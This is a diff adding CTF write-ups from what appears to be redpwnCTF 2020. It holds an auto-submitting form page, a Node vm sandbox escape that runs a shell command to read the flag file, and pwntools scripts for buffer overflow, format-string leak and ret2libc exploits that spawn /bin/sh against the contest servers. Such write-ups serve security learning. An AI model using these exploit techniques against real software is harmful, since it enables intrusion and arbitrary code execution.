+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>  
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse2'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse3'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse4'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse5'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse6'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse7'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse8'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse9'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse10'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse11'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse12'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse13'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse14'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse15'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse16'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse17'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse18'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse19'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse20'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse21'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse22'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse23'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse24'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">'iframe_container'</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">'formresponse25'</span> <span class="na">width</span><span class="o">=</span><span class="s">'350px'</span> <span class="na">height</span><span class="o">=</span><span class="s">'100px'</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">'0'</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+
+    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+        <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">index</span> <span class="o">&lt;</span> <span class="mi">12</span><span class="p">;</span> <span class="nx">index</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+          <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="nx">index</span><span class="p">].</span><span class="nx">target</span> <span class="o">=</span> <span class="p">(</span><span class="s1">'formresponse'</span> <span class="o">+</span> <span class="p">(</span><span class="nx">index</span><span class="o">+</span><span class="mi">1</span><span class="p">))</span>
+        <span class="p">}</span>
+        <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">index</span> <span class="o">&lt;</span> <span class="mi">12</span><span class="p">;</span> <span class="nx">index</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+          <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="nx">index</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>I know its a bad code, but who cares about "good" code when creating exploit :v</p>
+<p>anyway here's the flag</p>
+<p>flag = <code>flag{n0_m0r3_gu3551ng}</code></p>
+<p>For a record, after looking at other people's writeup I just surprised that I can use XMLHttpRequest instead of doing this stupid iframe things :(</p>
+<h1>uglybash</h1>
+<blockquote>
+<p>This bash script evaluates to echo dont just run it, dummy # flag{...} where the flag is in the comments. <br/>
+  The comment won't be visible if you just execute the script. How can you mess with bash to get the value right before it executes? <br/>
+  Enjoy the intro misc chal.  </p>
+</blockquote>
+<p>My way on solving this challenge is by changing the <code>eval</code> command (was <code>e$'\u0076'al</code>) into <code>printf '%s\n</code>, then run it, and from the output, change the <code>/bin/bash</code> command (was <code>$BASH ${*%%Y#0C}   ${*,,} &lt;&lt;&lt;</code>) into <code>printf '%s\n'</code> and run it. <br/>
+flag : <code>flag{us3_zsh,_dummy}</code></p>
+<h1>CaaSiNO</h1>
+<blockquote>
+<p>This is a vm jail challenge written in <strong>javascript</strong> <br/>
+  It utilizing this vm thing in javascript to create a child process and run every input in a new context so that we could'nt touch the parent context and read the flag  </p>
+</blockquote>
+<p>However there's a flaw in vm javascript that we can use to abuse the system and touch the parent context to be able to read the flag (more on this <a href="https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html" target="_blank">here</a>)</p>
+<p>and then i use this script to read the flag</p>
+<div class="codehilite"><pre><span></span><code><span class="k">this</span>
+    <span class="p">.</span><span class="nx">constructor</span>
+    <span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="s1">'return this.process'</span><span class="p">)()</span>
+    <span class="p">.</span><span class="nx">mainModule</span>
+    <span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="s1">'child_process'</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">execSync</span><span class="p">(</span><span class="s1">'cat /ctf/flag.txt'</span><span class="p">)</span>
+    <span class="p">.</span><span class="nx">toString</span><span class="p">()</span>
+</code></pre></div>
+<p><code>flag{vm_1snt_s4f3_4ft3r_41l_29ka5sqD}</code></p>
+<h1>ropes</h1>
 <blockquote>
 <p>It's not just a string, it's a rope!  </p>
 </blockquote>
@@ -97,6 +394,107 @@ I hate my data structures class! Why can't I just sort by hand?
 Well done!
 </code></pre>
 <p>flag : <code>flag{4ft3r_y0u_put_u54c0_0n_y0ur_c011ege_4pp5_y0u_5t1ll_h4ve_t0_d0_th15_57uff}</code></p>
+<h1>coffer-overflow-0</h1>
+<blockquote>
+<p>Can you fill up the coffers? We even managed to find the source for you. <br/>
+  nc 2020.redpwnc.tf 31199  </p>
+</blockquote>
+<p>just send a string with very long character and it will overflow the value of variable code. <br/>
+flag : <code>flag{b0ffer_0verf10w_3asy_as_123}</code> </p>
+<h1>coffer-overflow-1</h1>
+<blockquote>
+<p>The coffers keep getting stronger! You'll need to use the source, Luke. <br/>
+  nc 2020.redpwnc.tf 31255  </p>
+</blockquote>
+<p>this time we need to actually control a value, this can be done by filling the buffer until 8 bytes before rbp and fill the 8 bytes with value <code>0xcafebabe</code> </p>
+<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">pwn</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">remote</span><span class="p">(</span><span class="s2">"2020.redpwnc.tf"</span><span class="p">,</span> <span class="mi">31255</span><span class="p">)</span>
+<span class="c1"># r = pwn.process("coffer-overflow-1")</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s2">"A"</span><span class="o">*</span><span class="mi">24</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xcafebabe</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p>flag : <code>flag{th1s_0ne_wasnt_pure_gu3ssing_1_h0pe}</code> </p>
+<h1>coffer-overflow-2</h1>
+<blockquote>
+<p>You'll have to jump to a function now!? <br/>
+  nc 2020.redpwnc.tf 31908  </p>
+</blockquote>
+<p>this time we need to jump into <code>binFunction</code> function, this can be done by filling the buffer until it hit rbp and overflow the buffer with <code>binFunction</code> address  </p>
+<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">pwn</span>
+
+<span class="n">pad</span> <span class="o">=</span> <span class="s2">"A"</span> <span class="o">*</span> <span class="mi">16</span>
+<span class="n">win</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004006e6</span><span class="p">)</span>
+<span class="n">ret</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x000000000040053e</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">pad</span><span class="o">+</span><span class="n">ret</span><span class="o">+</span><span class="n">win</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">remote</span><span class="p">(</span><span class="s2">"2020.redpwnc.tf"</span><span class="p">,</span> <span class="mi">31908</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p>flag : <code>flag{ret_to_b1n_m0re_l1k3_r3t_t0_w1n}</code> </p>
+<h1>secret-flag</h1>
+<blockquote>
+<p>There's a super secret flag in printf that allows you to LEAK the data at an address?? <br/>
+  nc 2020.redpwnc.tf 31826 <br/>
+  if you look at the program on your dissasembler, you can see that our input become an argument on the printf function, however the program didn't call the printf properly, so we can input the string format <code>%s</code> and it will print a string somewhere from the stack, to control it simply do <code>%n$s</code> and it will print a random nth string somewhere from the stack.  </p>
+</blockquote>
+<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">pwn</span>
+
+<span class="n">response</span> <span class="o">=</span> <span class="s2">""</span>
+<span class="n">i</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="k">while</span> <span class="s1">'flag'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">response</span><span class="p">:</span>
+    <span class="c1"># print(i)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">"%"</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">"$s"</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">remote</span><span class="p">(</span><span class="s2">"2020.redpwnc.tf"</span><span class="p">,</span> <span class="mi">31826</span><span class="p">)</span>
+        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">"adventurer?</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="s2">"%"</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">"$s"</span><span class="p">)</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
+        <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">pass</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
+</code></pre></div>
+<p>flag : <code>flag{n0t_s0_s3cr3t_f1ag_n0w}</code></p>
+<h1>the-library</h1>
+<blockquote>
+<p>There's not a lot of useful functions in the binary itself. I wonder where you can get some... <br/>
+  nc 2020.redpwnc.tf 31350 <br/>
+  This is a ret2libc challenge, I got the code and explanation <a href="https://tasteofsecurity.com/security/ret2libc-unknown-libc/" target="_blank">here</a> <br/>
+  So basically we want to pop the value /bin/sh into RDI, the call system, system will read what to execute from RDI, thus executes /bin/sh</p>
+</blockquote>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> 
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">"2020.redpwnc.tf"</span><span class="p">,</span> <span class="mi">31350</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./the-library"</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"libc.so.6"</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
+
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s1">'pop rdi'</span><span class="p">,</span> <span class="s1">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">libc_start_main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'__libc_start_main'</span><span class="p">]</span>
+<span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">'puts'</span><span class="p">]</span>
+<span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'main'</span><span class="p">]</span>
+<span class="n">ret</span> <span class="o">=</span> <span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s1">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">pad</span> <span class="o">=</span> <span class="s2">"A"</span><span class="o">*</span><span class="mi">16</span> <span class="o">+</span> <span class="s2">"B"</span><span class="o">*</span><span class="mi">8</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">pad</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_start_main</span><span class="p">)</span> <span class="o">+</span>  <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">"?</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+
+<span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span>
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">"__libc_start_main"</span><span class="p">]</span>
+<span class="n">bin_sh</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s2">"/bin/sh"</span><span class="p">))</span> 
+<span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">"system"</span><span class="p">]</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">pad</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">"?</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p>flag : <code>flag{jump_1nt0_th3_l1brary}</code></p>
 <h1>base646464</h1>
 <blockquote>
 <p>Encoding something multiple times makes it exponentially more secure!  </p>
@@ -511,8 +909,8 @@ My solution may look atupid and lazy but actually I tried to find some way to de
 <p><strong>ALERT</strong> This one is a guessy chall</p>
 </blockquote>
 <p>We are given two images
-<img alt="a" src="/writeups-pic/35.jpg"/>
-<img alt="b" src="/writeups-pic/36.jpg"/></p>
